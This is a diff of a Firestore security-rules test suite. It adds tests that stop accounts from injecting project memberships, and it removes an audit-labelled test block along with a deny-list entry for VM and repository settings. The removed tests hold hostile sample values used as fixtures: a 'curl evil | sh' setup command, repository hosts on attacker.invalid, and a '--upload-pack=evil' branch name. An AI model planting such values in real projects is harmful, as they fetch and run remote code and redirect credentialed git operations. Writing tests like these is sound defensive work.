@@ -491,6 +491,42 @@ describe('project membership authority', () => {
         )
     })
 
+    // security audit 2026-11: 'invitation-remove' only needs request.auth.uid == userId, so it used
+    // to let any account add an arbitrary project id to its own membership lists.
+    it('does not let an account add a project to its own lists through invitation-remove', async () => {
+        const outsiderDb = testEnv.authenticatedContext(OUTSIDER_ID).firestore()
+        const proof = {
+            projectId: PROJECT_ID,
+            action: 'invitation-remove',
+            actorId: OUTSIDER_ID,
+            updatedAt: 3,
+        }
+        for (const field of ['projectIds', 'guideProjectIds', 'templateProjectIds', 'archivedProjectIds']) {
+            await assertFails(
+                updateDoc(doc(outsiderDb, `users/${OUTSIDER_ID}`), {
+                    [field]: [PROJECT_ID],
+                    projectMembershipMutation: proof,
+                })
+            )
+        }
+    })
+
+    it('does not let a member add a project to another account through invitation-add', async () => {
+        const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
+        await assertFails(
+            updateDoc(doc(memberDb, `users/${OUTSIDER_ID}`), {
+                invitedProjectIds: [PROJECT_ID],
+                projectIds: [PROJECT_ID],
+                projectMembershipMutation: {
+                    projectId: PROJECT_ID,
+                    action: 'invitation-add',
+                    actorId: MEMBER_ID,
+                    updatedAt: 4,
+                },
+            })
+        )
+    })
+
     it('allows atomic project deletion cleanup and scoped reload notification', async () => {
         const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
         const batch = writeBatch(memberDb)
@@ -656,52 +692,6 @@ describe('gold, premium and the Stripe link are server-owned', () => {
         )
         await assertFails(deleteDoc(doc(memberDb, `users/${MEMBER_ID}/goldRewardClaims/task-reward`)))
         await assertFails(setDoc(doc(memberDb, `users/${MEMBER_ID}/goldChangeClaims/claim`), { amount: 1 }))
-    })
-})
-
-describe('VM coding inputs on the project document are server-owned (security audit 2026-11)', () => {
-    // Another member's credentialed VM coding job boots from the golden snapshot and pairs the
-    // repository connection with that member's token, so a member must not be able to set them.
-    it.each([
-        ['vmGolden', { setupCommand: 'curl evil | sh', snapshotId: 'team/elsewhere:1', status: 'ready' }],
-        ['vmGolden.setupCommand', 'curl evil | sh'],
-        ['githubRepoUrl', 'https://attacker.invalid/acme/app'],
-        ['githubApiBase', 'https://attacker.invalid/api/v3'],
-        ['githubHost', 'https://attacker.invalid'],
-        ['githubBaseBranch', '--upload-pack=evil'],
-        ['gitlabRepoUrl', 'https://attacker.invalid/group/app'],
-        ['gitlabHost', 'https://attacker.invalid'],
-        ['gitlabBaseBranch', 'evil'],
-    ])('refuses a member write of %s', async (field, value) => {
-        const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
-
-        await assertFails(updateDoc(doc(memberDb, `projects/${PROJECT_ID}`), { [field]: value }))
-    })
-
-    it('leaves ordinary member edits of the project alone', async () => {
-        const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
-
-        await assertSucceeds(updateDoc(doc(memberDb, `projects/${PROJECT_ID}`), { name: 'Renamed' }))
-        await assertSucceeds(setDoc(doc(memberDb, `projects/${PROJECT_ID}`), { lastActionDate: 7 }, { merge: true }))
-    })
-
-    it('still lets a creator start a project with empty repository fields', async () => {
-        const creatorDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
-
-        await assertSucceeds(
-            setDoc(doc(creatorDb, 'projects/new-project-with-repo-fields'), {
-                creatorId: MEMBER_ID,
-                isShared: 2,
-                userIds: [MEMBER_ID],
-                githubRepoUrl: '',
-                githubBaseBranch: '',
-                githubHost: '',
-                githubApiBase: '',
-                gitlabRepoUrl: '',
-                gitlabBaseBranch: '',
-                gitlabHost: '',
-            })
-        )
     })
 })
 
@@ -1564,7 +1554,6 @@ describe('server-only data', () => {
         `firestoreAccessProjectionJobs/${PROJECT_ID}`,
         'firestoreAccessProjectionMigrations/schema-v2',
         'verifiedEmailIdentities/abc123/accounts/member',
-        `vmGoldens/${PROJECT_ID}`,
     ])('denies client reads and writes at %s', async documentPath => {
         const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
 
